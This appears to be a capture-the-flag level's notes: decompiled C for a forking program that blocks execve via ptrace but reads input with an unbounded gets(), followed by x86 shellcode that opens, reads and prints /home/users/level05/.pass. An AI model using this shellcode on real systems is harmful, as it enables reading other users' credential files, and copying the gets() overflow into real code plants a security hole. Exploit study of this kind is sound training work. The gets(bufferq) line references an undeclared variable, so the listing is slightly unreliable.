#include <defs.h>
#include <linux/prctl.h>
#include <signal.h>
#include <sys/ptrace.h>

int main(int argc, const char **argv, const char **envp)
{
  int stat_loc; // [esp+1Ch] [ebp-9Ch] BYREF
  char buffer[128]; // [esp+20h] [ebp-98h] BYREF
  int v6; // [esp+A0h] [ebp-18h]
  int v7; // [esp+A4h] [ebp-14h]
  int child_eax; // [esp+A8h] [ebp-10h]
  __pid_t pid; // [esp+ACh] [ebp-Ch]

  pid = fork();
  memset(buffer, 0, sizeof(buffer));
  child_eax = 0;
  stat_loc = 0;
  if ( pid )
  {
    do
    {
      wait(&stat_loc);
      if (WIFEXITED(stat_loc) || WIFSIGNALED(stat_loc) || WIFSTOPPED(stat_loc)) // On entre ici si le process enfant a terminé normalement, ou à cause d'un signal, ou s'il a été stopped
      {
        puts("child is exiting...");
        return 0;
      }
      child_eax = ptrace(PTRACE_PEEKUSER, pid, 44, 0);  // lit eax du programme enfant
    }
    while ( child_eax != 11 );
    puts("no exec() for you");
    kill(pid, 9);
  }
  else
  {
    prctl(PR_SET_PDEATHSIG, SIGHUP);
    ptrace(PTRACE_TRACEME, 0, 0, 0); // this sends a signal to the parent, it unblocks the call to wait()
    puts("Give me some shellcode, k");
    gets(bufferq);
  }
  return 0;
}

/home/users/level05/.pass
\x68ssap\x68./50\x68leve\x68l/sr\x68esu/\x68emoh\x68/\x00\x00\x00

\x31\xC9\xF7\xE1\xB0\x05\x51\x68ssap\x68./50\x68leve\x68l/sr\x68esu/\x68emoh\x68/\x00\x00\x00\x89\xE3\xCD\x80\x93\x91\xB0\x03\x66\xBA\xFF\x0F\x42\xCD\x80\x92\xB3\x01\xC1\xE8\x0A\xCD\x80\x93\xCD\x80